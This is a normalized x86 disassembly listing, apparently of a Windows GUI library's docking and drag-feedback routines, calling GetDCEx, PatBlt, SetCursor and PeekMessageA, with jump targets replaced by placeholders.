call sub_43c728
mov eax [ ebx + 0x14 ]
call sub_4030f0
mov eax edi
call sub_4030f0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_43d968
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_438ca0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407a3c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_43c39c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_438c0c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_43c39c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_43dd84
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_43defc
xor edx edx
mov eax edi
call sub_43c728
sub_43da44
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43c374
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402920
mov edx eax
mov eax ebx
call sub_43c39c
sub_43da80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_43daeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40416c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43daf2
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43daf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43dba7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43c104
mov eax [ ebp - 0x8 ]
call sub_43da80
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_43daf8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dbae
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_43daf8
pop ecx
sub_43dbb4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43dced
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43dc9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_438c0c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dca3
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43da80
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_438c20
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_43dca3
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_43daf8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dcf4
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
sub_43dcfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43c44c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43c474
call sub_43dcfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43c44c
call sub_43dcfc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43be7c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_43c374
mov edx eax
mov eax ebx
call sub_43c39c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43c39c
jmp r-xdata
sub_43dd84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_43dcfc
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_43ddc8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43c374
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_43c39c
sub_43ddf8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43a170
mov edx eax
mov eax [ rw-data ]
call sub_43e958
mov eax [ ebx + 0x14 ]
call sub_43a170
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_43df0c
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43de58
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_43e958
mov eax ebx
call sub_43df0c
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_43c39c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_43c39c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43dd84
push ebx
push sub_43defc
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_43c728
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_43ded4
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_438c0c
test eax eax
jle r-xdata
push ebx
push sub_43defc
xor edx edx
mov eax ebx
call sub_43c728
sub_43df0c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43bf40
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43bf40
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43bfac
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43bfac
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d358
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_43dff8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43dff8
pop ecx
mov eax ebx
call sub_43c374
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43c374
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43dff8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43c374
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4224c8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_43e088
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c374
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43bef8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_43c374
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_43dff8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e0d8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_433310
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_433310
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_43e154
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43be04
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43beb0
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_43c458
test eax eax
je r-xdata
mov eax esi
call sub_43be7c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43defc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_43c728
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43c458
mov edx [ ebx + 0x20 ]
call sub_43c3b0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_43e154
pop ecx
sub_43e1d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43be60
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43be60
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_43c458
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_43e1d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43defc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_43c728
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43c05c
mov eax edi
call sub_43c44c
test eax eax
je r-xdata
mov eax edi
call sub_43c458
mov esi eax
mov eax esi
call sub_43c374
push eax
mov eax esi
call sub_43beb0
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_43c44c
call sub_43c374
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_43c374
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_43c39c
mov eax esi
call sub_43c374
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43c39c
mov eax edi
call sub_43c458
call sub_43c3ec
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43beb0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43c39c
mov eax edi
call sub_43c44c
call sub_43c3ec
mov bl 0x1
jmp r-xdata
sub_43e30c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43c6c0
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412404
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ceb4
test eax eax
je r-xdata
push ebp
call sub_43e154
pop ecx
push ebp
call sub_43e1d4
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_43e0d8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_43e394
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43bf40
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43bf40
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43e088
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43e088
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_43e424
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e7fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43ceb4
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43de58
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43ceb4
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4334b4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e803
lea eax [ ebp - 0x48 ]
call sub_403eac
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43a170
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4321d0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_434688
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403eac
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_43e30c
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_438ca0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df0c
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_43e394
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43df0c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43ceb4
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_433890
jmp r-xdata
mov eax edi
call sub_44fbe8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43ceb4
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_433310
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_433970
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f00
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ddf8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43a170
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_434030
jmp r-xdata
sub_43e80c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_43e980
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_43e89c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43e958
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_43e900
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
